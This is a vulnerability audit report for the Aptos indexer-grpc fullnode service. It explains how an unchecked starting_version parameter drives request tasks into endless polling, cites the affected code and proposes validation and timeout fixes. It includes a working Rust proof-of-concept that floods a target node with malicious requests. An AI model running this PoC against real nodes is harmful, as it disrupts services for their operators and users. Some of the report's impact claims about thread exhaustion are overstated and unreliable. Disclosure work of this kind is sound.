# Audit Report

## Title
Indexer gRPC Service Resource Exhaustion via Unbounded starting_version Parameter

## Summary
The `GetTransactionsFromNodeRequest` API in the indexer-grpc fullnode service lacks validation on the `starting_version` parameter. When an attacker sets `starting_version` to a value far beyond the current ledger version (e.g., `u64::MAX - 1`), the node enters an infinite polling loop, causing resource exhaustion and service degradation.

## Finding Description
The vulnerability exists in the indexer-grpc fullnode service's transaction streaming functionality. The `GetTransactionsFromNodeRequest` protobuf message accepts a `starting_version` field [1](#0-0)  which specifies the ledger version to start streaming from.

The request handler only validates that `starting_version` is not `None`, but performs no bounds checking against the current ledger version [2](#0-1) . When a request is received, the service spawns a tokio task [3](#0-2)  that creates an `IndexerStreamCoordinator` to handle transaction fetching.

The coordinator's `process_next_batch()` method calls `fetch_transactions_from_storage()`, which in turn calls `get_batches()` [4](#0-3) . The `get_batches()` function invokes `ensure_highest_known_version()` [5](#0-4)  before creating any batches.

The critical flaw lies in `ensure_highest_known_version()` [6](#0-5) . This function contains a while loop that continues as long as `self.current_version > self.highest_known_version`. When `starting_version` is set to a value like `u64::MAX - 1` (18,446,744,073,709,551,614), and the actual ledger version is orders of magnitude smaller (e.g., 1,000,000), this condition remains perpetually true. The loop sleeps for 100 milliseconds per iteration [7](#0-6) , continuously polling for new ledger versions that will never catch up to the requested starting version.

**Attack Scenario:**
1. Attacker sends multiple `GetTransactionsFromNodeRequest` messages with `starting_version` set to `u64::MAX - 1`
2. Each request spawns a separate tokio task that enters the infinite polling loop
3. Each task sleeps 100ms per iteration, consuming thread pool resources
4. The gRPC connections remain open indefinitely (server only has keepalive settings [8](#0-7) , not request timeouts)
5. Legitimate indexer requests are delayed or fail as thread pool resources are exhausted
6. Node performance degrades significantly

## Impact Explanation
This vulnerability qualifies as **Medium Severity** under the Aptos bug bounty program for the following reasons:

1. **Validator node slowdowns**: The infinite polling loops consume tokio runtime threads, degrading overall node performance and response times for legitimate API requests.

2. **API crashes**: Under sustained attack with multiple concurrent malicious requests, the thread pool can be exhausted, causing the indexer-grpc service to become unresponsive or crash.

3. **State inconsistencies requiring intervention**: While this doesn't directly corrupt blockchain state, the service degradation may prevent indexers from maintaining consistent views of the ledger, requiring manual intervention to restart affected services.

The vulnerability does not reach Critical or High severity because:
- It does not affect consensus safety or validator operations directly
- It does not cause loss of funds or state corruption
- The indexer-grpc service is separate from core consensus functionality
- Node operators can mitigate by restricting network access to the indexer-grpc endpoint

## Likelihood Explanation
**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **No authentication required**: The indexer-grpc endpoint accepts unauthenticated connections by default
2. **Trivial to exploit**: Requires only basic gRPC client knowledge to craft malicious requests
3. **No rate limiting evident**: No code indicates rate limiting or request validation on the starting_version parameter
4. **Public exposure**: Many Aptos nodes expose indexer-grpc endpoints publicly for ecosystem indexers
5. **Immediate impact**: Each malicious request immediately spawns a resource-consuming task
6. **No intrinsic defense**: The only exit condition is an abort_handle that's initialized to false and never set to true based on timeout

## Recommendation
Implement validation to reject `starting_version` values that exceed reasonable bounds:

```rust
// In fullnode_data_service.rs, get_transactions_from_node method
async fn get_transactions_from_node(
    &self,
    req: Request<GetTransactionsFromNodeRequest>,
) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
    let r = req.into_inner();
    let starting_version = match r.starting_version {
        Some(version) => version,
        None => return Err(Status::invalid_argument("Starting version must be set")),
    };
    
    // ADD VALIDATION: Check starting_version against current ledger
    let latest_ledger_info = self.service_context.context
        .get_latest_ledger_info()
        .map_err(|e| Status::internal(format!("Failed to get ledger info: {}", e)))?;
    let current_version = latest_ledger_info.ledger_version.0;
    
    // Allow some reasonable buffer for future versions (e.g., 1000 ahead)
    const MAX_VERSION_AHEAD: u64 = 1000;
    if starting_version > current_version + MAX_VERSION_AHEAD {
        return Err(Status::invalid_argument(
            format!(
                "Starting version {} is too far beyond current ledger version {}. Maximum allowed is {}",
                starting_version, current_version, current_version + MAX_VERSION_AHEAD
            )
        ));
    }
    
    // Continue with existing logic...
}
```

Additionally, implement a timeout mechanism in `ensure_highest_known_version()`:

```rust
async fn ensure_highest_known_version(&mut self) -> bool {
    let mut empty_loops = 0;
    const MAX_WAIT_LOOPS: u32 = 600; // 60 seconds max wait (600 * 100ms)
    
    while self.highest_known_version == 0 || self.current_version > self.highest_known_version {
        if empty_loops >= MAX_WAIT_LOOPS {
            error!(
                current_version = self.current_version,
                highest_known_version = self.highest_known_version,
                "[Indexer Fullnode] Timeout waiting for starting_version to be available"
            );
            return false;
        }
        // ... existing code ...
    }
    true
}
```

## Proof of Concept

```rust
// PoC: Rust client demonstrating the resource exhaustion attack
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to target indexer-grpc endpoint
    let mut client = FullnodeDataClient::connect("http://target-node:50051").await?;
    
    // Launch multiple attack requests
    let mut handles = vec![];
    for i in 0..10 {
        let mut client_clone = client.clone();
        let handle = tokio::spawn(async move {
            println!("Attack request {} starting...", i);
            
            // Malicious request with starting_version far beyond ledger
            let request = Request::new(GetTransactionsFromNodeRequest {
                starting_version: Some(u64::MAX - 1), // 18,446,744,073,709,551,614
                transactions_count: None,
            });
            
            // This will cause the node to enter infinite polling loop
            let mut stream = client_clone
                .get_transactions_from_node(request)
                .await
                .expect("Request failed")
                .into_inner();
            
            // Stream will hang indefinitely
            while let Some(response) = stream.message().await.expect("Stream error") {
                println!("Attack {} received response: {:?}", i, response);
            }
        });
        handles.push(handle);
    }
    
    // Wait for all attack tasks (they will hang indefinitely)
    for handle in handles {
        let _ = handle.await;
    }
    
    Ok(())
}
```

**Expected Behavior:**
- Each spawned task will cause the target node to create an infinite polling loop
- Node's thread pool resources will be gradually exhausted
- Legitimate indexer requests will experience severe delays or failures
- CPU usage will increase from continuous polling
- Memory usage will grow from held gRPC connections and task state

## Notes
This vulnerability specifically affects the indexer-grpc fullnode service component, not the core consensus or validator operations. However, many production Aptos nodes run indexer-grpc services that are publicly accessible to support ecosystem indexers. The lack of input validation on version parameters represents a violation of the "Resource Limits" invariant, where operations should respect computational and resource constraints.

### Citations

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L67-76)
```rust
pub struct GetTransactionsFromNodeRequest {
    /// Required; start version of current stream.
    /// If not set will panic somewhere
    #[prost(uint64, optional, tag="1")]
    pub starting_version: ::core::option::Option<u64>,
    /// Optional; number of transactions to return in current stream.
    /// If not set, response streams infinitely.
    #[prost(uint64, optional, tag="2")]
    pub transactions_count: ::core::option::Option<u64>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L73-78)
```rust
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-117)
```rust
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L242-243)
```rust
    async fn fetch_transactions_from_storage(&mut self) -> Vec<(TransactionOnChainData, usize)> {
        let batches = self.get_batches().await;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L293-296)
```rust
    async fn get_batches(&mut self) -> Vec<TransactionBatchInfo> {
        if !self.ensure_highest_known_version().await {
            return vec![];
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L550-579)
```rust
    async fn ensure_highest_known_version(&mut self) -> bool {
        let mut empty_loops = 0;
        while self.highest_known_version == 0 || self.current_version > self.highest_known_version {
            if let Some(abort_handle) = self.abort_handle.as_ref() {
                if abort_handle.load(Ordering::SeqCst) {
                    return false;
                }
            }
            if empty_loops > 0 {
                tokio::time::sleep(Duration::from_millis(RETRY_TIME_MILLIS)).await;
            }
            empty_loops += 1;
            if let Err(err) = self.set_highest_known_version() {
                error!(
                    error = format!("{:?}", err),
                    "[Indexer Fullnode] Failed to set highest known version"
                );
                continue;
            } else {
                sample!(
                    SampleRate::Frequency(10),
                    info!(
                        highest_known_version = self.highest_known_version,
                        "[Indexer Fullnode] Found new highest known version",
                    )
                );
            }
        }
        true
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L32-32)
```rust
pub const RETRY_TIME_MILLIS: u64 = 100;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L102-103)
```rust
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
```
